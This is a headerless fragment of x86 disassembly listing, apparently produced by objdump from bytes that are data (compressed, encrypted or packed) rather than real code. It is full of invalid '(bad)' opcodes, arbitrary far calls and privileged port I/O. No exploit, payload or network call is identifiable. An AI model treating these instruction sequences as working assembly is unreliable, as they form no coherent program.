  414458:	add    esi,DWORD PTR [eax+0x49a9ad58]
  41445e:	or     eax,0xf3a7fcf
  414463:	jbe    0x4144a8
  414465:	adc    esp,DWORD PTR [edi+0x4cdff7c1]
  41446b:	add    eax,0x2a36c648
  414470:	into   
  414471:	sbb    al,BYTE PTR ds:0xd7aa6b06
  414477:	adc    ch,al
  414479:	xor    al,0x14
  41447b:	mov    bl,BYTE PTR [ebx+eax*1]
  41447e:	nop
  41447f:	stos   DWORD PTR es:[edi],eax
  414480:	xchg   edx,eax
  414481:	mov    WORD PTR [ebx],ds
  414483:	(bad)
  414486:	test   DWORD PTR [ebp+ecx*2-0x33b3b586],0x50579c
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x78]
  414501:	adc    eax,0xd5ec92c1
  414506:	add    BYTE PTR [eax],al
  414508:	add    al,0x1
  41450a:	add    BYTE PTR [eax],al
  41450c:	div    BYTE PTR [eax-0x4b]
  41450f:	stc    
  414510:	mov    dl,0x34
  414512:	(bad)  
  414513:	cwde   
  414514:	pcmpgtw mm3,mm2
  414517:	add    BYTE PTR [ebx+0x2d],cl
  41451a:	call   0xbc3e:0x73954b2f
  414521:	mov    bh,0xec
  414523:	push   0xc2c24540
  414528:	cmp    esi,DWORD PTR [ebx-0x78e0388e]
  41452e:	push   cs
  41452f:	(bad)  
  414530:	mov    eax,ds:0xd51e187c
  414535:	push   esp
  414536:	xor    DWORD PTR [esi],esp
  414538:	cmp    bh,al
  41453a:	mov    cl,0xaf
  41453c:	jbe    0x414516
  41453e:	push   0xfa00cdae
  414543:	xor    ch,BYTE PTR [esi+edx*1]
  414546:	xchg   esp,eax
  414547:	je     0x4145a4
  414549:	or     DWORD PTR [esi-0xa],0x43
  41454d:	inc    edx
  41454e:	xchg   ebp,eax
  41454f:	aaa    
  414550:	enter  0xe96e,0xe0
  414554:	adc    DWORD PTR [edx-0x41],ecx
  414557:	lea    edi,[ebp+eiz*4-0x29]
  41455b:	call   0x155:0xe13f949e
  414562:	lea    ebx,[edx-0x3bca4d72]
  414568:	inc    eax
  414569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41456a:	cmp    ebp,DWORD PTR [ebp+0x391e340b]
  414570:	fucomi st,st(2)
  414572:	sti    
  414573:	outs   dx,DWORD PTR ds:[esi]
  414574:	or     BYTE PTR [ebx],ah
  414576:	ficomp DWORD PTR [esi]
  414578:	not    esp
  41457a:	push   ebx
  41457b:	nop
  41457c:	and    al,0x82
  41457e:	outs   dx,DWORD PTR ds:[esi]
  41457f:	mov    esi,0x1556d374
  414584:	aam    0x69
  414586:	xor    edi,DWORD PTR [edx]
  414588:	jl     0x414580
  41458a:	(bad)  
  41458c:	xlat   BYTE PTR ds:[ebx]
  41458d:	lock jg 0x4145c1
  414590:	mov    cl,0xa1
  414592:	mov    WORD PTR [esi],ss
  414594:	ror    DWORD PTR [edi+0x5e],0xa3
  414598:	sub    DWORD PTR [ecx+0x1c],eax
  41459b:	nop
  41459c:	lds    ebx,FWORD PTR [ecx]
  41459e:	mov    ds:0xb71270bb,eax
  4145a3:	dec    edi
  4145a4:	in     eax,dx
  4145a5:	adc    DWORD PTR [edx-0x3c],0xda8fafca
  4145ac:	fstp   TBYTE PTR ds:0x37f7be6a
  4145b2:	and    ebx,eax
  4145b4:	fs out dx,al
  4145b6:	int3   
  4145b7:	sub    ebp,DWORD PTR [eax-0x2e692414]
  4145bd:	ins    DWORD PTR es:[edi],dx
  4145be:	inc    edi
  4145bf:	mov    WORD PTR [edx-0x7f],ss
  4145c2:	mov    edx,0xc73d1556
  4145c7:	(bad)  
  4145c8:	(bad)  [eax]
  4145ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145cb:	xchg   DWORD PTR [edx-0x35fc5c0],ebx
  4145d1:	in     eax,dx
  4145d2:	xchg   ecx,eax
  4145d3:	outs   dx,DWORD PTR ds:[esi]
  4145d4:	add    eax,0x8816521f
  4145d9:	inc    ecx
  4145da:	out    0x7,al
  4145dc:	shl    DWORD PTR [eax-0x77],1
  4145df:	cmp    eax,0xea3ab131
  4145e4:	enter  0xd497,0x55
  4145e8:	icebp  
  4145e9:	jb     0x414571
  4145eb:	dec    BYTE PTR [esi+ebx*8+0x11]
  4145ef:	xchg   ebx,eax
  4145f0:	cld    
  4145f1:	out    0x57,eax
  4145f3:	mov    eax,DWORD PTR [eax-0x6a]
  4145f6:	cbw    
  4145f8:	fild   DWORD PTR [ebp-0x1d]
  4145fb:	and    bh,BYTE PTR [edi]
  4145fd:	xchg   esp,eax
  4145fe:	jp     0x4145ac
  414600:	mov    dh,0x90
  414602:	(bad)  
  414605:	out    0xaf,al
  414607:	mov    ebx,0x412d8349
  41460c:	adc    esi,esi
  41460e:	lods   eax,DWORD PTR ds:[esi]
  41460f:	xor    BYTE PTR [eax],al
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x64
  414681:	cmp    dh,bl
  414683:	lock lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	test   BYTE PTR [edx+ecx*1],dh
  41468f:	push   eax
  414690:	aam    0x4
  414692:	(bad)  
  414693:	xchg   edi,eax
  414694:	push   ds
  414695:	jle    0x41465e
  414697:	dec    esp
  414698:	aaa    
  414699:	test   al,0x31
  41469b:	call   0xeae3:0x2def01fc
  4146a2:	les    edx,FWORD PTR [ebx-0x45a26cc]
  4146a8:	dec    edi
  4146a9:	or     BYTE PTR [ebp+ecx*2-0x55c37e44],dh
  4146b0:	inc    edi
  4146b1:	cmp    DWORD PTR [ebp+0x35830516],esi
  4146b7:	dec    edi
  4146b8:	xchg   ebp,eax
  4146b9:	(bad)  
  4146ba:	pushf  
  4146bb:	hlt    
  4146bc:	stos   BYTE PTR es:[edi],al
  4146bd:	inc    edi
  4146be:	dec    edi
  4146bf:	jl     0x4146c9
  4146c1:	lods   eax,DWORD PTR ds:[esi]
  4146c2:	sbb    bh,BYTE PTR [ebx-0x6a]
  4146c5:	push   ebp
  4146c6:	call   0x1615:0xa34cfc3d
  4146cd:	add    eax,0xbba66c97
  4146d2:	pusha  
  4146d3:	ja     0x4146e2
  4146d5:	ja     0x41466d
  4146d7:	shr    DWORD PTR [ebx+0x6a],0xe8
  4146db:	and    ch,0xe3
  4146de:	hlt    
  4146df:	out    0x65,al
  4146e1:	gs clc 
  4146e3:	pop    es
  4146e4:	adc    al,0x67
  4146e6:	cmp    BYTE PTR [ebx],cl
  4146e8:	xor    DWORD PTR [ebx-0x6],ecx
  4146eb:	ss pusha 
  4146ed:	enter  0xe793,0xb1
  4146f1:	ins    DWORD PTR es:[edi],dx
  4146f2:	or     eax,0x63a49911
  4146f7:	mov    ah,0x10
  4146f9:	fwait
  4146fa:	int3   
  4146fb:	mov    cl,dl
  4146fd:	(bad)
  414700:	retf   
  414701:	sbb    BYTE PTR [ebx+0x2e8d1e39],al
  414707:	inc    ebp
  414708:	daa    
  414709:	sbb    eax,DWORD PTR [esi+0x63]
  41470c:	push   0x61
  41470e:	scas   al,BYTE PTR es:[edi]
  41470f:	dec    edx
  414710:	iret   
  414711:	in     al,0x63
  414713:	rol    BYTE PTR [eax+0xc],0x16
  414717:	xor    DWORD PTR [ecx-0x39956478],eax
  41471d:	jmp    0x78f6:0xf5c39e6f
  414724:	fild   DWORD PTR [edi+0x1488c33f]
  41472a:	call   0xfa055ac7
  41472f:	jo     0x4146b2
  414731:	cs xchg ebx,eax
  414733:	mov    dh,0x42
  414735:	inc    ebp
  414736:	out    dx,eax
  414737:	iret   
  414738:	or     ecx,DWORD PTR [ecx]
  41473a:	mov    ebp,0xceb375ca
  41473f:	xchg   ebp,eax
  414740:	push   edx
  414741:	add    edi,DWORD PTR [ebp-0x52]
  414744:	lods   al,BYTE PTR ds:[esi]
  414745:	push   0x85d5d5d7
  41474a:	sub    bh,BYTE PTR [esi]
  41474c:	dec    cl
  41474e:	add    eax,DWORD PTR ds:0x72fb15b0
  414754:	(bad)  
  414756:	and    DWORD PTR [edi-0x38335cee],edx
  41475c:	jg     0x41475a
  41475e:	cwde   
  41475f:	xchg   ebp,eax
  414760:	mov    ebp,0x687ee23b
  414765:	arpl   WORD PTR [ebx+0x5],cx
  414768:	out    dx,al
  414769:	mov    ds,WORD PTR [edx]
  41476b:	mov    dl,0x73
  41476d:	jno    0x4147ec
  41476f:	jecxz  0x4146fe
  414771:	mov    ds:0xb68ac1b0,al
  414776:	fidivr DWORD PTR [edi-0x46]
  414779:	mov    WORD PTR [ebp-0x52],gs
  41477c:	pop    edi
  41477d:	test   DWORD PTR [ecx-0x29855b91],esp
  414783:	mov    eax,DWORD PTR [ebx]
  414785:	bound  ebp,QWORD PTR [edx-0x2a]
  414788:	fs call 0x4b7a:0x6b11f3f9
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x2b508e44
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	jmp    0xb9e1:0x99f6913
  414813:	ins    DWORD PTR es:[edi],dx
  414814:	push   esp
  414815:	add    al,0xfb
  414817:	dec    esi
  414818:	pop    eax
  414819:	fcomp  DWORD PTR [edx+ebx*1-0x2793e0f8]
  414820:	xchg   DWORD PTR [edi],esp
  414822:	outs   dx,DWORD PTR ds:[esi]
  414823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414824:	repnz pop ss
  414826:	xchg   edi,eax
  414827:	mov    dh,BYTE PTR [eax+0x55]
  41482a:	cmp    DWORD PTR [ecx+eiz*4],ebx
  41482d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41482e:	add    dl,ah
  414830:	mov    DWORD PTR [edx+0xcf221ad],ebp
  414836:	fs inc edx
  414838:	push   edi
  414839:	xor    DWORD PTR [ebx-0x113d4f6f],ebp
  41483f:	mov    dl,0x5
  414841:	aas    
  414842:	inc    ebx
  414843:	lock std 
  414845:	or     ebp,DWORD PTR [esi-0x6b8fb76]
  41484b:	loopne 0x414822
  41484d:	mov    ebp,0x2733acbd
  414852:	dec    ebp
  414853:	cmp    BYTE PTR [ebx+esi*8],0xb5
  414857:	xchg   edi,eax
  414858:	stc    
  414859:	mov    ds:0xd57d98f1,al
  41485e:	xor    DWORD PTR [ebx-0x23],ecx
  414861:	jo     0x414819
  414863:	sbb    eax,0xc012ed78
  414868:	sub    eax,0x7cb384b6
  41486d:	push   edi
  41486f:	in     al,0x8c
  414871:	pop    ss
  414872:	inc    esp
  414873:	sar    DWORD PTR [ebp+0x75],1
  414876:	in     al,0x3e
  414878:	or     BYTE PTR [ecx+ebp*1+0x3e],ah
  41487c:	mov    ebp,gs
  41487e:	call   0x6b0c:0xddcecead
  414885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414886:	rol    esi,cl
  414888:	cmp    BYTE PTR ds:[eax-0x1c],bh
  41488c:	add    edi,edx
  41488e:	cmp    cl,ch
  414890:	popa   
  414891:	loopne 0x4148b8
  414893:	fadd   QWORD PTR [edi-0x4d3d5a72]
  414899:	push   ss
  41489a:	jmp    0x97a4:0xb9b6e09b
  4148a1:	repz imul ebx,DWORD PTR [edx-0x4e8d47d0],0xdb39d51d
  4148ac:	pushf  
  4148ad:	in     eax,0x98
  4148af:	gs hlt 
  4148b1:	and    DWORD PTR [ebp+0x2a],0x3a
  4148b5:	int3   
  4148b6:	ret    
  4148b7:	push   ebp
  4148b8:	sub    ebp,DWORD PTR [esi-0x4b]
  4148bb:	adc    BYTE PTR [esi+0x7e],dh
  4148be:	cli    
  4148bf:	inc    eax
  4148c0:	jle    0x414884
  4148c2:	push   ebx
  4148c3:	fist   WORD PTR [eax]
  4148c5:	jge    0x414946
  4148c7:	dec    eax
  4148c8:	xor    eax,0xc3c22d73
  4148cd:	mov    ds:0x7bc23655,al
  4148d2:	adc    eax,0xfe299a48
  4148d7:	mov    ebp,0xff1ef2a7
  4148dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148dd:	jecxz  0x414919
  4148df:	cmp    ah,ch
  4148e1:	inc    edx
  4148e2:	mov    es,WORD PTR [edi+0x28b8a13f]
  4148e8:	fadd   QWORD PTR [ebp+0x4d]
  4148eb:	inc    DWORD PTR [ebx]
  4148ed:	pop    edi
  4148ee:	jmp    0x414961
  4148f0:	sbb    DWORD PTR [eax],ebx
  4148f2:	fidivr DWORD PTR [edi+0x1e9318b5]
  4148f8:	cmp    al,0x79
  4148fa:	sbb    al,0x7a
  4148fc:	psrlw  mm2,QWORD PTR [ebp-0x2091b7a8]
  414903:	xchg   ebp,eax
  414904:	xor    dl,BYTE PTR [edi-0x45]
  414907:	push   ebp
  414908:	jo     0x4148c2
  41490a:	cld    
  41490b:	enter  0x4817,0x7a
  41490f:	cmp    al,0x0
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	xchg   esp,eax
  414981:	ins    DWORD PTR es:[edi],dx
  414982:	lods   eax,DWORD PTR ds:[esi]
  414983:	adc    edi,eax
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	ror    DWORD PTR [esi-0x7817330b],0xf0
  414993:	xlat   BYTE PTR ds:[ebx]
  414994:	pop    esp
  414995:	inc    eax
  414996:	add    ebx,DWORD PTR [esi+0x32]
  414999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499a:	call   0x95a6df86
  41499f:	jns    0x414964
  4149a1:	sub    ebp,esi
  4149a3:	mov    dl,0x1c
  4149a5:	fstp   QWORD PTR [edi+0x78fe9957]
  4149ab:	and    eax,0x7ff05dda
  4149b0:	mov    al,ds:0xcc87820d
  4149b5:	ss clc 
  4149b7:	mov    ds:0x43dd3fd4,al
  4149bc:	mov    ebx,ecx
  4149be:	(bad)  
  4149c0:	call   0x1b166a1f
  4149c5:	scas   eax,DWORD PTR es:[edi]
  4149c6:	out    0x12,al
  4149c8:	test   BYTE PTR [eax+edi*1+0x5e255dc9],dl
  4149cf:	mov    eax,DWORD PTR [edx]
  4149d1:	test   DWORD PTR [edi-0x696487f4],esp
  4149d7:	call   0x9762:0xfd5cc7cc
  4149de:	inc    ecx
  4149df:	jno    0x41497b
  4149e1:	out    dx,eax
  4149e2:	mov    esi,0x13e8306
  4149e7:	inc    edx
  4149e8:	fld    QWORD PTR [ecx-0x33]
  4149eb:	jae    0x4149ca
  4149ed:	sahf   
  4149ee:	push   es
  4149ef:	cmp    al,0x98
  4149f1:	xchg   edx,eax
  4149f2:	out    0xac,eax
  4149f4:	jns    0x4149ab
  4149f6:	ret    
  4149f7:	adc    cl,BYTE PTR [edx-0x20826ec8]
  4149fd:	rcr    DWORD PTR [edx+0x20921ac8],0xe0
  414a04:	(bad)  
  414a05:	mov    dl,0xd4
  414a07:	inc    ecx
  414a08:	pop    edx
  414a09:	sub    BYTE PTR [ecx-0x66],ah
  414a0c:	xor    DWORD PTR [ebx-0x5d145641],ecx
  414a12:	and    DWORD PTR [ecx+0x39ab6c25],ecx
  414a18:	xchg   esp,eax
  414a19:	imul   ebp,DWORD PTR [bp+di+0x38],0xfffffff3
  414a1e:	ss cmp al,0x50
  414a21:	scas   eax,DWORD PTR es:[edi]
  414a22:	dec    edi
  414a23:	and    ah,0xf2
  414a26:	mov    ah,0xa8
  414a28:	mov    ecx,0x469cf520
  414a2d:	ins    BYTE PTR es:[edi],dx
  414a2e:	in     eax,0x1c
  414a30:	dec    ebx
  414a31:	dec    ecx
  414a32:	test   eax,0xa342337c
  414a37:	nop
  414a38:	ret    0xcb5d
  414a3b:	jae    0x414a71
  414a3d:	push   ecx
  414a3e:	sbb    al,0x4e
  414a40:	ret    0xc40d
  414a43:	jno    0x414ab5
  414a45:	pop    ss
  414a46:	xor    edx,0xe93485dd
  414a4c:	xchg   DWORD PTR [ecx+eiz*8-0x50],ebx
  414a50:	lds    esi,FWORD PTR [edx-0x21]
  414a53:	lahf   
  414a54:	repnz dec ecx
  414a56:	xchg   ebp,eax
  414a57:	pop    ebp
  414a58:	xchg   esi,eax
  414a59:	shl    DWORD PTR [ecx],cl
  414a5b:	(bad)  
  414a5c:	loope  0x414a98
  414a5e:	(bad)  
  414a5f:	sti    
  414a60:	adc    eax,0xdf45ebed
  414a65:	mov    esp,0x62680abc
  414a6a:	js     0x414a2f
  414a6c:	or     al,0xaa
  414a6e:	je     0x414ac0
  414a70:	mov    cl,0xf0
  414a72:	dec    ebx
  414a73:	bound  esp,QWORD PTR [ebp+0x156edec1]
  414a79:	cmp    DWORD PTR [edi],esp
  414a7b:	jl     0x414af8
  414a7d:	(bad)  
  414a7e:	cld    
  414a7f:	inc    ebp
  414a80:	mov    edi,0x7b90a521
  414a85:	add    DWORD PTR [esi+0x20],esi
  414a88:	mov    dh,0xa
  414a8a:	call   0xec1a6eac
  414a8f:	push   ds
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x574563d9]
  414b02:	xor    eax,0xd9fc38
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	ja     0x414a90
  414b0e:	fsubr  st,st(7)
  414b10:	adc    eax,0xbd73b19f
  414b15:	nop
  414b16:	loope  0x414ae4
  414b18:	xchg   DWORD PTR [esi],esi
  414b1a:	test   eax,0x2d08a3f7
  414b1f:	add    bl,BYTE PTR ds:0x53bfb4b9
  414b25:	mov    ecx,edi
  414b27:	int    0x1a
  414b29:	and    al,0xb0
  414b2b:	mov    BYTE PTR ds:0x6bab6d6e,ah
  414b31:	cmp    eax,0x1ddf82ce
  414b36:	mov    ds:0x3514fb39,al
  414b3b:	cld    
  414b3c:	inc    eax
  414b3d:	pop    eax
  414b3e:	fwait
  414b3f:	rol    dh,0x93
  414b42:	and    eax,0x3539a5e2
  414b47:	fisttp WORD PTR [edx]
  414b49:	cld    
  414b4a:	cwde   
  414b4b:	sbb    DWORD PTR [esi+eax*2+0x23],ebp
  414b4f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414b51:	add    eax,0x12c65dd0
  414b56:	or     BYTE PTR [edx-0x6a6e3468],bh
  414b5c:	pop    es
  414b5d:	dec    edx
  414b5e:	clc    
  414b5f:	add    esi,ebp
  414b61:	scas   eax,DWORD PTR es:[edi]
  414b62:	aaa    
  414b63:	jg     0x414b16
  414b65:	mov    ebp,0x290b5e6b
  414b6a:	daa    
  414b6b:	in     al,dx
  414b6c:	sbb    BYTE PTR [eax],dh
  414b6e:	dec    edi
  414b6f:	ficomp DWORD PTR [edx-0x4e197ec3]
  414b75:	inc    edx
  414b76:	pop    ebp
  414b77:	mov    eax,0xd270fa5c
  414b7c:	xchg   esp,eax
  414b7d:	ror    BYTE PTR [esi-0xcc517a5],cl
  414b83:	sbb    al,0x34
  414b85:	test   eax,0x4c0da6cd
  414b8a:	scas   al,BYTE PTR es:[edi]
  414b8b:	imul   ebp,DWORD PTR [eax+0x4907ea3f],0xe41949d2
  414b95:	cli    
  414b96:	dec    ebx
  414b97:	adc    cl,dl
  414b99:	sbb    al,0x23
  414b9b:	out    dx,al
  414b9c:	mov    eax,0x89aae262
  414ba1:	sbb    BYTE PTR [ebx+esi*1],bh
  414ba4:	icebp  
  414ba5:	xchg   esp,eax
  414ba6:	mov    ds,WORD PTR [edi+0x2d]
  414ba9:	add    esp,ebx
  414bab:	pop    DWORD PTR ds:0x4b08a66b
  414bb1:	jle    0x414b99
  414bb3:	loopne 0x414b36
  414bb5:	std    
  414bb6:	cmp    eax,0x528983e4
  414bbb:	lahf   
  414bbc:	mov    ebx,0x81a10fe2
  414bc1:	fsubr  DWORD PTR [ebx-0x22cf127c]
  414bc7:	push   eax
  414bc8:	sbb    ch,BYTE PTR [ecx+0x2dea6256]
  414bce:	jo     0x414bb5
  414bd0:	daa    
  414bd1:	adc    cl,al
  414bd3:	int3   
  414bd4:	(bad)  
  414bd5:	dec    ebp
  414bd6:	pop    ds
  414bd7:	pop    ebp
  414bd8:	call   0xf9c9071e
  414bdd:	xchg   ebp,eax
  414bde:	cdq    
  414bdf:	jecxz  0x414bc9
  414be1:	hlt    
  414be2:	push   cs
  414be3:	hlt    
  414be4:	jb     0x414c55
  414be6:	mov    cl,0x55
  414be8:	jae    0x414c4f
  414bea:	dec    ebx
  414beb:	mov    WORD PTR ss:[eax-0x59],?
  414bef:	mov    cl,0x44
  414bf1:	stc    
  414bf2:	push   eax
  414bf3:	ror    DWORD PTR [ebx-0x54],1
  414bf6:	stc    
  414bf7:	icebp  
  414bf8:	gs (bad) 
  414bfa:	aad    0xf8
  414bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bfd:	shr    DWORD PTR es:[eax+0xd],0x46
  414c02:	daa    
  414c03:	(bad)  
  414c04:	retf   
  414c05:	jge    0x414ba5
  414c07:	leave  
  414c08:	je     0x414b92
  414c0a:	fcmovnbe st,st(5)
  414c0c:	adc    al,ch
  414c0e:	scas   al,BYTE PTR es:[edi]
  414c0f:	mov    BYTE PTR [eax],0x0
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebx,DWORD PTR cs:[eax-0x45]
  414c82:	add    BYTE PTR [ecx+0x0],dl
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR [ecx+eax*1],al
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	mov    cl,0x36
  414c8e:	test   al,0x1c
  414c90:	mov    al,0xe3
  414c92:	pop    ebp
  414c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c94:	xor    eax,0x71c11a8d
  414c99:	mov    edi,0xa5c28c4f
  414c9e:	push   ebx
  414c9f:	rcr    DWORD PTR [eax],cl
  414ca1:	fs push ds
  414ca3:	add    edi,ebx
  414ca5:	xor    DWORD PTR [ebp-0x3b42a2f5],edi
  414cab:	inc    ebx
  414cac:	adc    al,dl
  414cae:	pop    ecx
  414caf:	fild   WORD PTR [eax]
  414cb1:	jo     0x414ca1
  414cb3:	aam    0xe0
  414cb5:	mov    BYTE PTR [eax],dl
  414cb7:	xor    al,BYTE PTR [edi-0x5d56c9f4]
  414cbd:	xchg   edx,eax
  414cbe:	cmp    dl,al
  414cc0:	push   esi
  414cc1:	adc    ch,BYTE PTR [ecx+0x5999bb41]
  414cc7:	and    DWORD PTR [ecx+0xe],eax
  414cca:	nop
  414ccb:	pop    ds
  414ccc:	dec    eax
  414ccd:	(bad)  
  414cce:	test   eax,0xec94cddb
  414cd3:	cs dec ebp
  414cd5:	xchg   esi,eax
  414cd6:	push   edx
  414cd7:	outs   dx,BYTE PTR ds:[esi]
  414cd8:	mov    ebp,0x6d708fb9
  414cdd:	xor    ecx,edx
  414cdf:	pop    ebx
  414ce0:	aas    
  414ce1:	add    BYTE PTR [ecx-0x1b],ch
  414ce4:	pop    edi
  414ce5:	out    dx,eax
  414ce6:	inc    ebx
  414ce7:	(bad)  
  414ce8:	loopne 0x414d37
  414cea:	sbb    eax,0x22cf55db
  414cef:	imul   eax,DWORD PTR [eax+0x5e],0xffffff9b
  414cf3:	arpl   ax,bx
  414cf5:	retf   0x3f1a
  414cf8:	xor    eax,0x414b2b49
  414cfd:	jbe    0x414cc4
  414cff:	jns    0x414c91
  414d01:	rol    DWORD PTR [ebx],0x7e
  414d04:	data16 adc BYTE PTR ds:0x75f616ec,dl
  414d0b:	setp   bl
  414d0e:	push   ecx
  414d0f:	jne    0x414d4a
  414d11:	push   0x891c1846
  414d16:	popa   
  414d17:	mov    DWORD PTR [edx+0x37],0xa8af2fe7
  414d1e:	popf   
  414d1f:	push   eax
  414d20:	push   ebx
  414d21:	dec    eax
  414d22:	xlat   BYTE PTR ds:[ebx]
  414d23:	push   ebp
  414d24:	inc    edi
  414d25:	or     ebx,0xffffffb9
  414d28:	mov    bh,0x4a
  414d2a:	jmp    0x414d3e
  414d2c:	or     eax,0x31070ab6
  414d31:	jnp    0x414da0
  414d33:	or     DWORD PTR [esi+0x29d27fc0],ebp
  414d39:	fdivr  st,st(1)
  414d3b:	fwait
  414d3c:	ror    BYTE PTR [edx],1
  414d3e:	aam    0xc1
  414d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d41:	dec    esi
  414d42:	lahf   
  414d43:	je     0x414d6e
  414d45:	push   es
  414d46:	ja     0x414ce0
  414d48:	jecxz  0x414cf2
  414d4a:	mov    WORD PTR [ebp+eiz*8+0x4b],?
  414d4e:	mov    DWORD PTR [eax-0x188d110f],esi
  414d54:	jb     0x414cd8
  414d56:	xor    eax,0x61d4678b
  414d5b:	fst    DWORD PTR [esi+0x1f]
  414d5e:	clc    
  414d5f:	mov    bh,0x51
  414d61:	pop    ecx
  414d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d63:	call   0xf5e4:0x268b283e
  414d6a:	jo     0x414d91
  414d6c:	adc    bl,BYTE PTR [eax]
  414d6e:	cwde   
  414d6f:	ins    BYTE PTR es:[edi],dx
  414d70:	jecxz  0x414d44
  414d72:	fs mov edx,0xe2332331
  414d78:	mov    ds:0x8a96ba3e,al
  414d7d:	neg    DWORD PTR [ebx]
  414d7f:	test   dl,dh
  414d81:	mov    ebp,0xffa5c355
  414d86:	mov    edi,0x875c0d24
  414d8b:	fwait
  414d8c:	das    
  414d8d:	push   edx
  414d8e:	xchg   esp,eax
  414d8f:	mov    es,WORD PTR [eax]
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xd93e8762
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	pop    ss
  414e0d:	jp     0x414dfa
  414e0f:	cmp    ebx,DWORD PTR [esi+esi*4+0x5e]
  414e13:	cli    
  414e14:	xor    BYTE PTR [edx-0x3ea42f23],0xa5
  414e1b:	ficomp DWORD PTR [edx]
  414e1d:	(bad)  
  414e1e:	sub    BYTE PTR [eax-0x7bde146c],bl
  414e24:	ins    DWORD PTR es:[edi],dx
  414e25:	push   es
  414e26:	cmp    BYTE PTR ss:[edx-0x36894868],0x90
  414e2e:	add    DWORD PTR [esi+0x78367ce],edx
  414e34:	fwait
  414e35:	xor    eax,0xa176340b
  414e3a:	xchg   ebx,eax
  414e3b:	lock fisubr WORD PTR cs:0x68e8975a
  414e43:	cmp    edx,DWORD PTR [edi+0x4d]
  414e46:	jnp    0x414de4
  414e48:	cmc    
  414e49:	cwde   
  414e4a:	sub    ecx,ecx
  414e4c:	loope  0x414dfe
  414e4e:	cmp    al,0xc
  414e50:	cmp    BYTE PTR [ebx-0x16],0x90
  414e54:	das    
  414e55:	hlt    
  414e56:	sub    ebp,DWORD PTR [ebx-0x7d19af06]
  414e5c:	clc    
  414e5d:	or     DWORD PTR [ebp-0x535bc42c],ecx
  414e63:	jle    0x414e3e
  414e65:	mov    ebx,0xed43797e
  414e6a:	ret    
  414e6b:	cmc    
  414e6c:	dec    esi
  414e6d:	nop
  414e6e:	xor    DWORD PTR [edi+esi*4],ebx
  414e71:	dec    esi
  414e72:	or     BYTE PTR [eax+eax*8],bl
  414e75:	sbb    eax,ebx
  414e77:	jg     0x414e98
  414e79:	inc    eax
  414e7a:	jl     0x414e29
  414e7c:	xor    dl,dh
  414e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e7f:	std    
  414e80:	out    dx,al
  414e81:	jg     0x414e3a
  414e83:	leave  
  414e84:	test   eax,0x72176e2
  414e89:	add    bh,BYTE PTR [ebp+0x22]
  414e8c:	sahf   
  414e8d:	inc    ecx
  414e8e:	xor    dl,bh
  414e90:	mov    al,ds:0x1f967af3
  414e95:	cmc    
  414e96:	adc    al,0xcf
  414e98:	gs sub esp,eax
  414e9b:	cmp    al,0x50
  414e9d:	xchg   cl,cl
  414e9f:	jmp    0xe6ef:0x1b9439a3
  414ea6:	pop    ebx
  414ea7:	int    0x3f
  414ea9:	cmp    esp,DWORD PTR [ebx-0x3a]
  414eac:	(bad)
  414eaf:	stc    
  414eb0:	sub    ebp,DWORD PTR [eax+0x1a501a0f]
  414eb6:	icebp  
  414eb7:	js     0x414edb
